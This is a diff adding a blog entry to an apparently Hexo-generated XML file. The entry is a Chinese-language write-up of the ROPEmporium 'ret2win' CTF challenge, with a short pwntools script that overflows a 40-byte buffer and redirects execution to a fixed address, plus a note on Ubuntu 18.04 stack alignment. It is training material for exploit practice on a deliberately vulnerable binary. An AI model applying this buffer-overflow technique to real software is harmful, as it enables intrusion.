@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>ROPEmporium ret2win</title>
+      <link href="/2020/04/13/ret2win/"/>
+      <url>/2020/04/13/ret2win/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>整个过程遇到了许多的坑，系统是ubuntu 18.04.</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p><a href="https://ropemporium.com/challenge/ret2win.html" target="_blank" rel="noopener">https://ropemporium.com/challenge/ret2win.html</a></p></blockquote><p>checksec</p><p><img src="https://i.loli.net/2020/04/13/uW1I7QOGf5B3aq9.png" alt="image-20200413103432122"></p><p>r2</p><p><img src="https://i.loli.net/2020/04/13/Aiw4HRZID8yGfpK.png" alt="image-20200413103753525"></p><p>发现是fgets</p><p><img src="https://i.loli.net/2020/04/13/jOLK3wlnsfJcbTI.png" alt="image-20200413103911513"></p><p>可以看出来要ret到这个函数里面</p><p>gdb</p><p><img src="https://i.loli.net/2020/04/13/VKAMJZ8t3bWFLsx.png" alt="image-20200413104216804"></p><p><img src="https://i.loli.net/2020/04/13/Utjrz4REmhTYqla.png" alt="image-20200413104400096"></p><p>padding应该有40位。</p><p>构造相应的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2win'</span>)</span><br><span class="line">info(<span class="string">'%#x target'</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># ret2win = p64(elf.symbols.ret2win)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(<span class="number">0x400824</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag=io.recvall()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/13/GEvNs2xaceT8nQl.png" alt="image-20200413104630237"></p><h2 id="一个坑"><a href="#一个坑" class="headerlink" title="一个坑"></a>一个坑</h2><p>ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。</p><p>原因好像是18.04在内存对齐上有特殊的要求，等研究好了这里会补充</p><blockquote><p>[<a href="https://ropemporium.com/guide.html#Common%20pitfalls]" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common%20pitfalls]</a>(<a href="https://ropemporium.com/guide.html#Common" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common</a> pitfalls)</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> PWN </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ROPEmporium </tag>
+            
+            <tag> ret2win </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Pwnalbe.kr C2.collision WP</title>
       <link href="/2020/04/09/Pwnable%202/"/>
       <url>/2020/04/09/Pwnable%202/</url>
